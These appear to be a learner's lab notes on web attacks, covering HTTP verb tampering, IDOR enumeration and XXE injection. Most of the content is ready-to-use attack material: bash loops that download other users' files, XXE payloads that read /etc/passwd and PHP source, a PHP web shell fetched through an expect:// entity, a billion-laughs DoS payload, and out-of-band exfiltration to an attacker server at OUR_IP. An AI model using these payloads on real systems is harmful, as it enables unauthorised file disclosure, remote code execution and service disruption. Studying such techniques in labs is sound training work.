# Web Attacks

## HTTP Verb Tampering

### Identify

```sh
curl -i -X OPTIONS http://SERVER_IP:PORT/
```
```http
HTTP/1.1 200 OK
Date: 
Server: Apache/2.4.41 (Ubuntu)
Allow: POST,OPTIONS,HEAD,GET
```

HEAD is identical to GET but does not return body in HTTP response.

Once we change `POST` to `HEAD` and forward the request, we will see that we no longer get a login prompt or a `401 Unauthorized` page and get an empty output instead, as expected with a `HEAD` request. If we go back to the `File Manager` web application, we will see that all files have indeed been deleted, meaning that we successfully triggered the `Reset` functionality without having admin access or any credentials.

### Bypassing Security Filters

if a security filter was being used to detect injection vulnerabilities and only checked for injections in `POST` parameters (e.g. `$_POST['parameter']`), it may be possible to bypass it by simply changing the request method to `GET`.

## IDOR

IDOR vulnerabilities occur when a web application exposes a direct reference to an object, like a file or a database resource, which the end-user can directly control to obtain access to other similar objects

Many developers ignore building an access control system; hence, most web applications and mobile applications are left unprotected on the back-end. In such applications, all users may have arbitrary access to all other user's data on the back-end. The only thing stopping users from accessing other user's data would be the front-end implementation of the application, which is designed to only show the user's data. In such cases, manually manipulating HTTP requests may reveal that all users have full access to all data, leading to a successful attack.

### Identifying

- URL parameter & APIs
- AJAX calls
	- Check source code
- Understand hashing/encoding
- Compare user roles
	- we want to perform more advanced IDOR attacks, we may need to register multiple users and compare their HTTP requests and object references. This may allow us to understand how the URL parameters and unique identifiers are being calculated and then calculate them for other users to gather their data

### Mass IDOR Enumeration

Bikin script
```bash
#!/bin/bash

url="http://SERVER_IP:PORT"

for i in {1..10}; do
        for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do
                wget -q $url/$link
        done
done

# script utk practice
url="http://94.237.57.211:40312/"

for i in {1..20}; do
        for link in $(curl -X POST -s "$url/documents.php" -d "uid=2" | grep -oP "\/documents[^'\"]*\.\w+"); do
                wget -q $url/$link
        done
done

for i in {1..20}; do
        for link in $(curl -X POST -s "$url/documents.php" -d "uid=2" | grep -oP "\/documents[^'\"]*\.\w+"); do
                wget -q $url/$link
        done
done
```

### Bypass Encoded References

btoa(uid): uid to base64

**Tip:** We are using the `-n` flag with `echo`, and the `-w 0` flag with `base64`, to avoid adding newlines, in order to be able to calculate the `md5` hash of the same value, without hashing newlines, as that would change the final `md5` hash.

```shell-session
for i in {1..10}; do echo -n $i | base64 -w 0 | md5sum | tr -d ' -'; done
```

```bash
#!/bin/bash

for i in {1..20}; do
    for hash in $(echo -n $i | base64 -w 0 | md5sum | tr -d ' -'); do
        curl -sOJ -X POST -d "contract=$hash" http://94.237.57.211:40312/download.php
    done
done

for i in {1..20}; do
    for hash in $(echo -n $i | base64); do
        curl -X POST "http://94.237.57.211:40312/download.php?contract=$hash"
        echo "http://94.237.57.211:40312/download.php?contract=$hash"
    done
done
```

### IDOR in Insecure APIs

Change parameter, but sometimes there's mechanism in API that blocks to change role. Example: UUID mismatch with ID

### IDOR Prevention

- Object-Level Access Control
```javascript
match /api/profile/{userId} {
	allow read, write: if user.isAuth == true
	&& (user.uid == userId || user.roles == 'admin');
}
```
- Object Referencing: we can use `UUID V4` to generate a strongly randomized id for any element

## XXE

### Intro

Key elements of an XML document

| Key           | Definition                                                                                                    | Example                                  |
| ------------- | ------------------------------------------------------------------------------------------------------------- | ---------------------------------------- |
| `Tag`         | The keys of an XML document, usually wrapped with (`<`/`>`) characters.                                       | `<date>`                                 |
| `Entity`      | XML variables, usually wrapped with (`&`/`;`) characters.                                                     | `&lt;`                                   |
| `Element`     | The root element or any of its child elements, and its value is stored in between a start-tag and an end-tag. | `<date>01-01-2022</date>`                |
| `Attribute`   | Optional specifications for any element that are stored in the tags, which may be used by the XML parser.     | `version="1.0"`/`encoding="UTF-8"`       |
| `Declaration` | Usually the first line of an XML document, and defines the XML version and encoding to use when parsing it.   | `<?xml version="1.0" encoding="UTF-8"?>` |

`XML Document Type Definition (DTD)` allows the validation of an XML document against a pre-defined document structure. The pre-defined document structure can be defined in the document itself or in an external file.

Define custom entities

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY company "Inlane Freight">
]>
```

Once we define an entity, it can be referenced in an XML document between an ampersand `&` and a semi-colon `; ` (e.g. `&company;`).

Reference custom entities

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "http://localhost/company.txt">
  <!ENTITY signature SYSTEM "file:///var/www/html/signature.txt">
]>
```

When we reference an external entity (e.g. `&signature;`), the parser will replace the entity with its value stored in the external file (e.g. `signature.txt`). When the XML file is parsed on the server-side, in cases like **SOAP (XML) APIs or web forms**, then an entity can reference a file stored on the back-end server, which may eventually be disclosed to us when we reference the entity.

### Local File Disclosure

Suppose we can define new entities and have them displayed on the web page. In that case, we should also be able to define external entities and make them reference a local file, which, when displayed, should show us the content of that file on the back-end server.

#### Reference local file

```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "file:///etc/passwd">
]>
```

#### Reference source code: (only works in PHP app)

```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
```

#### RCE (only on PHP app)

```sh
echo '<?php system($_REQUEST["cmd"]);?>' > shell.php
sudo python3 -m http.server 80
```

```xml
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
]>
<root>
<name></name>
<tel></tel>
<email>&company;</email>
<message></message>
</root>
```

**Note:** We replaced all spaces in the above XML code with `$IFS`, to avoid breaking the XML syntax. Furthermore, many other characters like `|`, `>`, and `{` may break the code, so we should avoid using them.

#### Other: DoS
```xml
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY a0 "DOS" >
  <!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
  <!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
  <!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
  <!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
  <!ENTITY a5 "&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;">
  <!ENTITY a6 "&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;">
  <!ENTITY a7 "&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;">
  <!ENTITY a8 "&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;">
  <!ENTITY a9 "&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;">        
  <!ENTITY a10 "&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;">        
]>
...
```

### Advanced File Disclosure

Some file formats may not be readable through basic XXE, while in other cases, the web application may not output any input values in some instances, so we may try to force it through errors.

#### Advanced Exfiltration with CDATA

 To output data that does not conform to the XML format, we can wrap the content of the external file reference with a `CDATA` tag (e.g. `<![CDATA[ FILE_CONTENT ]]>`). One easy way to tackle this issue would be to define a `begin` internal entity with `<![CDATA[`, an `end` internal entity with `]]>`, and then place our external entity file in between,

Store it in DTD file, then reference it as external entity on target.

```sh
echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
python3 -m http.server 8000
```

Then add this to XML request.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA[">
  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> 
  <!ENTITY % end "]]>">
  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd"> 
  %xxe;
]>
	<root>
	<email>&joined;</email> 
	...
```

**Note:** In some modern web servers, we may not be able to read some files (like index.php), as the web server would be preventing a DOS attack caused by file/entity self-reference.

#### Error Based XXE

If the web application displays runtime errors (e.g., PHP errors) and does not have proper exception handling for the XML input, then we can use this flaw to read the output of the XXE exploit.

If a random error cause the web app to reveal web server directory, we can use it to read the source code of other files.
```xml
<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
```
In this case, `%nonExistingEntity;` does not exist, so the web application would throw an error saying that this entity does not exist, along with our joined `%file;` as part of the error. There are many other variables that can cause an error, like a bad URI or having bad characters in the referenced file.

Reference the error entity in request

```xml
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %error;
]>
```

This method may also be used to read the source code of files. All we have to do is change the file name in our DTD script to point to the file we want to read (e.g. `"file:///var/www/html/submitDetails.php"`). However, `this method is not as reliable as the previous method for reading source files`, as it may have length limitations, and certain special characters may still break it.

### Blind Data Exfiltration

#### Out-of-band Data Exfiltration

We will make the web application send a web request to our web server with the content of the file we are reading

xxe.dtd
```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
```
Finally, we can decode the parameter string from the shell to get the content of the file

We can even write a simple PHP script that automatically detects the encoded file content, decodes it, and output in terminal
```php
# index.php
<?php
if(isset($_GET['content'])){
    error_log("\n\n" . base64_decode($_GET['content']));
}
?>
```
```sh
php -S 0.0.0.0:8000
```

Then use `<root>&content</root>` to reference our entity in HTTP request
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %oob;
]>
<root>&content;</root>
```

#### Automated OOB Exfiltration

In many other cases, we can automate the process of blind XXE data exfiltration with tools. One such tool is [XXEinjector](https://github.com/enjoiz/XXEinjector)
```sh
git clone https://github.com/enjoiz/XXEinjector.git
```

Copy the HTTP request to a file for the tool to use, then write XXEINJECT in position locator
```http
POST /blind/submitDetails.php HTTP/1.1
Host: 10.129.201.94
Content-Length: 169
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
Content-Type: text/plain;charset=UTF-8
Accept: */*
Origin: http://10.129.201.94
Referer: http://10.129.201.94/blind/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

<?xml version="1.0" encoding="UTF-8"?>
XXEINJECT
```

```sh
ruby XXEinjector.rb --host=[tun0 IP] --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter

cat Logs/10.129.201.94/etc/passwd.log 
```